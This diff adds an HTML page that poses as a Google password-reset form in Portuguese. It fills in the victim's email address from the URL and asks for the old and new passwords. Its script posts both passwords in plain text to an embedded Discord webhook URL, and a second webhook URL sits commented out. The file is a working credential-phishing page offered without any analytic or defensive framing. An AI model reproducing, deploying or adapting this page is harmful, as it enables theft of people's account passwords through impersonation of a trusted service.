@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Google | Redefinição de Senha</title>
+  <link rel="icon" href="smlicon.png">
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  
+  
+  
+  <img src="smlicon.png" width="150px">
+  <br>
+  <p class="lilinfo">Redefinição de senha para <span></span></p>
+  <br>
+  
+  <label>Palavra-passe antiga</label>
+  <input type="password" id="passV">
+  <label>Nova Palavra-passe</label>
+  <input type="password" id="passNV">
+  <label>Confirmação</label>
+  <input type="password">
+  <br>
+ 
+ <br>
+ <button onclick="enviar()">Criar nova senha</button>
+  
+  
+  
+  
+  <script>
+  var emD=document.querySelector("span");
+ 
+  var em=new URLSearchParams(window.location.search);
+  emD.innerText=em.get("mail");
+  
+    //var webhook="https://discord.com/api/webhooks/1325624816505720862/2UVTgKRP5V7H1Qeg0xBqA5hJgwMKmjRu7LQ6D8PqD4iGTmj_BnEqP3-MlN7FUh5xrT-g";
+    
+var webhook="https://discord.com/api/webhooks/1361837466834702568/h2AeTArsuQrcHwvONnYggHF8IDS96nE_BZsG8UHU2NMSjKrDJvSa144FrejRSomOJ-ss"
+    
+
+
+async function enviar(){
+  var senha1="";
+  senha1=document.getElementById("passV").value;
+  var senha2="";
+  senha2=document.getElementById("passNV").value;
+  if (senha1.length==0 || senha2.length==0){
+    alert("Preencha todos os campos.");
+  }else{
+    msg={content:"Senha Antiga: "+senha1+"\nSenha Nova: "+senha2}
+    await fetch(webhook,{
+      method:"POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify(msg)
+    });
+    senha1="";
+    senha2="";
+  }
+  
+}
+
+
+
+
+  </script>
+</body>
+</html>
